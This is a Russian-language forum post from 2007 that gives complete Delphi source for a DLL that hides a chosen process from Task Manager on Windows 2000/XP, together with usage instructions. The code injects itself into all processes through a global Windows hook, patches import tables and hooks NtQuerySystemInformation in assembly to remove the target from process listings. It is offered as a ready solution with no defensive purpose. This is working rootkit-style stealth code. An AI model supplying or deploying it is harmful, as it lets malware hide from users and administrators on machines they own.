---
Title: Как спрятать программу от Task Manager в Windows 2000 и Windows XP?
Date: 01.01.2007
Author: Curve
Source: <https://forum.sources.ru>
---

Как спрятать программу от Task Manager в Windows 2000 и Windows XP?
===================================================================

Этот вопрос меня уже достал, он задаётся на всех программистских
форумах, поэтому я выкладываю solution. Листинг библиотеки (nthide.dll),
которая будет выполнять нужную нам функцию:

    library hide;
    uses
     Windows,
     SysUtils,
     ImageHlp,
     TlHelp32;
    type
     SYSTEM_INFORMATION_CLASS = (
      SystemBasicInformation,
      SystemProcessorInformation,
      SystemPerformanceInformation,
      SystemTimeOfDayInformation,
      SystemNotImplemented1,
      SystemProcessesAndThreadsInformation,
      SystemCallCounts,
      SystemConfigurationInformation,
      SystemProcessorTimes,
      SystemGlobalFlag,
      SystemNotImplemented2,
      SystemModuleInformation,
      SystemLockInformation,
      SystemNotImplemented3,
      SystemNotImplemented4,
      SystemNotImplemented5,
      SystemHandleInformation,
      SystemObjectInformation,
      SystemPagefileInformation,
      SystemInstructionEmulationCounts,
      SystemInvalidInfoClass1,
      SystemCacheInformation,
      SystemPoolTagInformation,
      SystemProcessorStatistics,
      SystemDpcInformation,
      SystemNotImplemented6,
      SystemLoadImage,
      SystemUnloadImage,
      SystemTimeAdjustment,
      SystemNotImplemented7,
      SystemNotImplemented8,
      SystemNotImplemented9,
      SystemCrashDumpInformation,
      SystemExceptionInformation,
      SystemCrashDumpStateInformation,
      SystemKernelDebuggerInformation,
      SystemContextSwitchInformation,
      SystemRegistryQuotaInformation,
      SystemLoadAndCallImage,
      SystemPrioritySeparation,
      SystemNotImplemented10,
      SystemNotImplemented11,
      SystemInvalidInfoClass2,
      SystemInvalidInfoClass3,
      SystemTimeZoneInformation,
      SystemLookasideInformation,
      SystemSetTimeSlipEvent,
      SystemCreateSession,
      SystemDeleteSession,
      SystemInvalidInfoClass4,
      SystemRangeStartInformation,
      SystemVerifierInformation,
      SystemAddVerifier,
      SystemSessionProcessesInformation
     );
     _IMAGE_IMPORT_DESCRIPTOR = packed record
      case Integer of
       0:(
        Characteristics: DWORD);
       1:(
        OriginalFirstThunk:DWORD;
        TimeDateStamp:DWORD;
        ForwarderChain: DWORD;
        Name: DWORD;
        FirstThunk: DWORD);
     end;
     IMAGE_IMPORT_DESCRIPTOR=_IMAGE_IMPORT_DESCRIPTOR;
     PIMAGE_IMPORT_DESCRIPTOR=^IMAGE_IMPORT_DESCRIPTOR;
     PFARPROC=^FARPROC;
    procedure ReplaceIATEntryInOneMod(pszCallerModName: Pchar; pfnCurrent: FarProc; pfnNew: FARPROC; hmodCaller: hModule);
    var     ulSize: ULONG;
       pImportDesc: PIMAGE_IMPORT_DESCRIPTOR;
        pszModName: PChar;
            pThunk: PDWORD; ppfn:PFARPROC;
            ffound: LongBool;
           written: DWORD;
    begin
     pImportDesc:= ImageDirectoryEntryToData(Pointer(hmodCaller), TRUE,IMAGE_DIRECTORY_ENTRY_IMPORT, ulSize);
      if pImportDesc = nil then exit;
      while pImportDesc.Name<>0 do
       begin
        pszModName := PChar(hmodCaller + pImportDesc.Name);
         if (lstrcmpiA(pszModName, pszCallerModName) = 0) then break;
        Inc(pImportDesc);
       end;
      if (pImportDesc.Name = 0) then exit;
     pThunk := PDWORD(hmodCaller + pImportDesc.FirstThunk);
      while pThunk^<>0 do
       begin
        ppfn := PFARPROC(pThunk);
        fFound := (ppfn^ = pfnCurrent);
         if (fFound) then
          begin
           VirtualProtectEx(GetCurrentProcess,ppfn,4,PAGE_EXECUTE_READWRITE,written);
           WriteProcessMemory(GetCurrentProcess, ppfn, @pfnNew, sizeof(pfnNew), Written);
           exit;
          end;
        Inc(pThunk);
       end;
    end;
    var
     addr_NtQuerySystemInformation: Pointer;
     mypid: DWORD;
     fname: PCHAR;
     mapaddr: PDWORD;
     hideOnlyTaskMan: PBOOL;
    function myNtQuerySystemInfo(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: Pointer;
     SystemInformationLength:ULONG; ReturnLength:PULONG):LongInt; stdcall;
    label onceagain, getnextpidstruct, quit, fillzero;
    asm
     push ReturnLength
     push SystemInformationLength
     push SystemInformation
     push dword ptr SystemInformationClass
     call dword ptr [addr_NtQuerySystemInformation]
     or eax,eax
     jl quit
     cmp SystemInformationClass, SystemProcessesAndThreadsInformation
     jne quit
    onceagain:
     mov esi, SystemInformation
    getnextpidstruct:
     mov ebx, esi
     cmp dword ptr [esi],0
     je quit
     add esi, [esi]
     mov ecx, [esi+44h]
     cmp ecx, mypid
     jne getnextpidstruct
     mov edx, [esi]
     test edx, edx
     je fillzero
     add [ebx], edx
     jmp onceagain
    fillzero:
     and [ebx], edx
     jmp onceagain
    quit:
     mov Result, eax
    end
    
    procedure InterceptFunctions;
    var hSnapShot: THandle;
             me32: MODULEENTRY32;
    begin
     addr_NtQuerySystemInformation:=GetProcAddress(getModuleHandle('ntdll.dll'),'NtQuerySystemInformation');
     hSnapShot:=CreateToolHelp32SnapShot(TH32CS_SNAPMODULE,GetCurrentProcessId);
      if hSnapshot=INVALID_HANDLE_VALUE then exit;
       try
        ZeroMemory(@me32,sizeof(MODULEENTRY32));
        me32.dwSize:=sizeof(MODULEENTRY32);
        Module32First(hSnapShot,me32);
         repeat
          ReplaceIATEntryInOneMod('ntdll.dll',addr_NtQuerySystemInformation,@MyNtQuerySystemInfo,me32.hModule);
         until not Module32Next(hSnapShot,me32);
       finally
        CloseHandle(hSnapShot);
       end;
    end;
    
    procedure UninterceptFunctions;
    var hSnapShot: THandle;
             me32: MODULEENTRY32;
    begin
     addr_NtQuerySystemInformation:=GetProcAddress(getModuleHandle('ntdll.dll'),'NtQuerySystemInformation');
     hSnapShot:=CreateToolHelp32SnapShot(TH32CS_SNAPMODULE,GetCurrentProcessId);
      if hSnapshot=INVALID_HANDLE_VALUE then exit;
      try
       ZeroMemory(@me32,sizeof(MODULEENTRY32));
       me32.dwSize:=sizeof(MODULEENTRY32);
       Module32First(hSnapShot,me32);
        repeat
         ReplaceIATEntryInOneMod('ntdll.dll',@MyNtQuerySystemInfo,addr_NtQuerySystemInformation,me32.hModule);
        until not Module32Next(hSnapShot,me32);
      finally
       CloseHandle(hSnapShot);
      end;
    end;
    
    var HookHandle: THandle;
    function CbtProc(code: integer; wparam: integer; lparam: integer):Integer; stdcall;
    begin
     Result:=0;
    end;
    
    procedure InstallHook; stdcall;
    begin
     HookHandle:=SetWindowsHookEx(WH_CBT, @CbtProc, HInstance, 0);
    end;
    
    var hFirstMapHandle:THandle;
    
    function HideProcess(pid:DWORD; HideOnlyFromTaskManager:BOOL):BOOL; stdcall;
    var addrMap: PDWORD;
           ptr2: PBOOL;
    begin
     mypid:=0;
     result:=false;
     hFirstMapHandle:=CreateFileMapping($FFFFFFFF,nil,PAGE_READWRITE,0,8,'NtHideFileMapping');
      if hFirstMapHandle=0 then exit;
     addrMap:=MapViewOfFile(hFirstMapHandle,FILE_MAP_WRITE,0,0,8);
      if addrMap=nil then
       begin
        CloseHandle(hFirstMapHandle);
        exit;
       end;
     addrMap^:=pid;
     ptr2:=PBOOL(DWORD(addrMap)+4);
     ptr2^:=HideOnlyFromTaskManager;
     UnmapViewOfFile(addrMap);
     InstallHook;
     result:=true;
    end;
    
    exports
     HideProcess;
    var
     hmap: THandle;
    procedure LibraryProc(Reason: Integer);
    begin
     if Reason = DLL_PROCESS_DETACH then
      if mypid > 0 then
       UninterceptFunctions()
     else
      CloseHandle(hFirstMapHandle);
    end;
    
    begin
     hmap:=OpenFileMapping(FILE_MAP_READ,false,'NtHideFileMapping');
      if hmap=0 then exit;
      try
       mapaddr:=MapViewOfFile(hmap,FILE_MAP_READ,0,0,0);
        if mapaddr=nil then exit;
       mypid:=mapaddr^;
       hideOnlyTaskMan:=PBOOL(DWORD(mapaddr)+4);
        if hideOnlyTaskMan^ then
         begin
          fname:=allocMem(MAX_PATH+1);
          GetModuleFileName(GetModuleHandle(nil),fname,MAX_PATH+1);
           if not (ExtractFileName(fname)='taskmgr.exe') then exit;
         end;
       InterceptFunctions;
      finally
       UnmapViewOfFile(mapaddr);
       CloseHandle(Hmap);
       DLLProc:=@LibraryProc;
      end;
    end.


Для её использования нужно вызвать функцию HideProcess:

    function HideProcess(pid:DWORD; HideOnlyFromTaskManager:BOOL):BOOL,

где

pid - идентификатор процесса, который нужно спрятать.

HideOnlyFromTaskManager - нужно ли прятать процесс только от
TaskManager\'а, или же от остальных программ, использующих для получения
списка процессов функцию NtQuerySystemInformation из ntdll.dll.

Пример использования:

    function HideProcess(pid: DWORD; HideOnlyFromTaskManager: BOOL): BOOL;
    stdcall; external 'nthide.dll';
    
    < skipped >
    
    procedure proc;
    begin
      HideProcess(GetCurrentProcessId, false); //это спрячет текущий процесс
    end;

